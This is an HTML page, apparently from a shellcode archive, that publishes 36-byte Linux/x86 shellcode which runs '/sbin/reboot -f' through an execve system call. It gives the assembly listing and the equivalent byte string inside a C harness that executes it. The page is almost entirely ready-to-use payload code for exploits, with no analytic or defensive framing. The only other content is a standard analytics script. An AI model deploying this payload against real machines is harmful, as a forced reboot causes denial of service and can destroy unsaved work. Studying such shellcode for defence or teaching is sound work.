<html><head><title>Linux/x86 - Force Reboot shellcode 36 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
**********************************************
* Linux/x86 Force Reboot shellcode 36 bytes  *
**********************************************
* Author: Hamza Megahed                      *
**********************************************
* Twitter: @Hamza_Mega                       *
**********************************************
* blog: hamza-mega[dot]blogspot[dot]com      *
**********************************************
* E-mail: hamza[dot]megahed[at]gmail[dot]com *
**********************************************

xor    %eax,%eax
push   %eax
push   $0x746f6f62
push   $0x65722f6e
push   $0x6962732f
mov    %esp,%ebx
push   %eax
pushw  $0x662d
mov    %esp,%esi
push   %eax
push   %esi
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

**********************************************

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
 
char *shellcode = &quot;\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e&quot;
                  &quot;\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3&quot;
                  &quot;\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53&quot;
                  &quot;\x89\xe1\xb0\x0b\xcd\x80&quot;;

int main(void)
{
fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
